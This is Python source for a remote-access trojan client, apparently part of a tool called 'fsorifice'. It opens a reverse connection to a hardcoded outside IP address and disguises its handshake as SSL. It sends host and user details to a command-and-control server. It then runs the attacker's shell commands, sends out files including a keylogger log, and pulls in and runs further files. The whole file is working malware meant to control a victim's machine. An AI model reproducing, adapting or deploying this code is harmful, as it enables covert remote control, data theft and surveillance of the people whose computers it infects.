from config.conf                  import conf_client
from modules.network.file_handler import f_handler
from modules.network.crypto.AES   import tcp_cipher
from modules.network.crypto.RSA   import key_cipher
from modules.admin.shell          import shellexec
import os
import time
import socket
import ctypes
import cPickle
import platform
import threading
import subprocess


class fso_connector(object):

    def __init__(self):
        # defining some global variables
        self.VERSION       = "0.5.0"
        self.RHOST         = "185.86.149.202"
        self.RPORT         = 443
        self.isconnected   = False
        self.sleepTime     = 3

        # os info.
        self.hostname      = ""
        self.os_name       = ""
        self.os_rel        = ""
        self.uid           = ""

        # create instances for our modules.
        self._conf_client  = conf_client()
        self._keyutil      = key_cipher()
        self._cipher       = tcp_cipher()
        self._file_handler = f_handler()
        self._shellexec    = shellexec()

        # the key used for ssl operation.
        self.SESSION_KEY   = ""


    # make reverse tcp connection to the attacker.
    def connector_loop(self):
        while True:
            try:
                # create new instances.
                self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # connecting to port 1366 for handshake.
                print "[*] Unable to connect back to the server."
                self.serversocket.connect((self.RHOST, self.RPORT))

                # delay 1.5 sec and send handshake message as well as hostname.
                self.serversocket.send('SSL Hello')
                self.handshake_msg = self.serversocket.recv(32)

                if self.handshake_msg != 'SSL Hello done':
                    raise self.e
                else:
                    # generate a new sessions key.
                    self.SESSION_KEY = self._keyutil.generate_aes()

                    # receive pubkey from the server.
                    self.session_pubkey = cPickle.loads(self.serversocket.recv(1024))

                    # generate a random aeskey, encrypt it with server's pubkey and send it back.
                    time.sleep(1.5)
                    self.serversocket.send(self._keyutil.encrypt(self.session_pubkey, self.SESSION_KEY))

                    # ssl session established. send hostname info and begin session.
                    time.sleep(1.5)
                    self.serversocket.send(self.hostname + self.VERSION)

                    print "[*] Successfully establish connection to the server."
                    print "[*] Session Opened."
                    self.command_handler(self.serversocket)

            except Exception, self.e:
                # delay 10 secs before next attempt to connect.
                time.sleep(self.sleepTime)



    def command_handler(self, serversocket):
        while True:
            # IMPORTANT: The code here will get the trojan to always auto-reconnect.
            # send heartbeats to check the availability of the c&c server.
            # if the c&c server is down, it will break loop and try to re-connect.
            try:
                self.hb_content = ""
                serversocket.send(self.hb_content.encode("UTF-8"))
            except:
                break

            # heartbeat test passed. now try to receive from the server.
            try:
                self.response_cont = ''
                packet = serversocket.recv(4096)
                command_raw = packet.decode("UTF-8")
                command_raw = self._cipher.decrypt(command_raw, self.SESSION_KEY)
            except:
                serversocket.close()
                break

            # argument parsing.
            try:
                rc_main = command_raw.split('@')[0]
                tmp     = command_raw.split('@')[1]
                rc_arg1 = tmp.split(',')[0]
                rc_arg2 = tmp.split(',')[1]

                print '[DEBUG] command_raw = ' + command_raw
                print '[DEBUG] rc_main     = ' + rc_main
                print '[DEBUG] rc_arg1     = ' + rc_arg1
                print '[DEBUG] rc_arg2     = ' + rc_arg2

            except:
                pass

            # read and execute the command sent from the attacker.
            if command_raw == "ping":
                try:
                    self.send_response(serversocket, "[*] Host is up.")
                except:
                    pass

            elif command_raw == "exit":
                break

            elif command_raw == "getuid":
                try:
                    self.response_cont = "Sever username: %s" % self.uid
                    self.send_response(serversocket, self.response_cont)
                except:
                    pass

            elif command_raw == "info":
                try:
                    self.response_cont  = "[*] Retrieving remote host info...\n"
                    self.response_cont += "Hostname:\t%s\nOS name:\t%s\nOS Release:\t%s\n" % (self.hostname, self.os_name, self.os_rel)
                    self.send_response(serversocket, self.response_cont)
                except:
                    pass

            elif command_raw == "pwd":
                try:
                    self.response_cont = "Current Directory: %s" % self._shellexec.cwd
                    self.send_response(serversocket, self.response_cont)
                except:
                    pass

            elif command_raw == "ipconfig":
                try:
                    if self.os_name == "Windows":
                        self.send_response(serversocket, self._shellexec.Run('ipconfig'))
                    else:
                        self.send_response(serversocket, self._shellexec.Run('ifconfig'))
                except:
                    pass

            elif rc_main == "admin/shell_exec":
                self.send_response(serversocket, self._shellexec.Run(rc_arg1))

            elif command_raw == "gather/keylogger":
                self._file_handler.upload(serversocket, '/home/decimate/Documents/klog-test.txt', self.SESSION_KEY)

            elif rc_main == "manage/download":
                self._file_handler.upload(serversocket, rc_arg1, self.SESSION_KEY)

            elif rc_main == "manage/upload":
                self._file_handler.download(serversocket, rc_arg2, self.SESSION_KEY)

            elif rc_main == "manage/execute":
                os.system(rc_arg1)

            else:
                try:
                    self.send_response(serversocket, "[-] Error: Unable to execute the command.")
                except:
                    pass


    def send_response(self, serversocket, response):
        try:
            response = self._cipher.encrypt(response, self.SESSION_KEY)
            serversocket.send(response.encode("UTF-8"))
        except:
            pass

    def get_sysinfo(self):
        self.hostname = socket.gethostname()
        self.os_name  = platform.system()
        self.os_rel   = platform.release()

        # get username. we need to check serveral environment variables until the string is not empty.
        self.envar_list = ['USER', 'USERNAME', 'LOGUSER', 'LNAME']
        for self.var in self.envar_list:
            try:
                self.uid = os.environ[self.var]
            except:
                continue

    def Start(self):
        self.get_sysinfo()
        self.connector_loop()


# create a new connector instance and start the primary reverse tcp connection.
_fsorifice_connector = fso_connector()
_fsorifice_connector.Start()
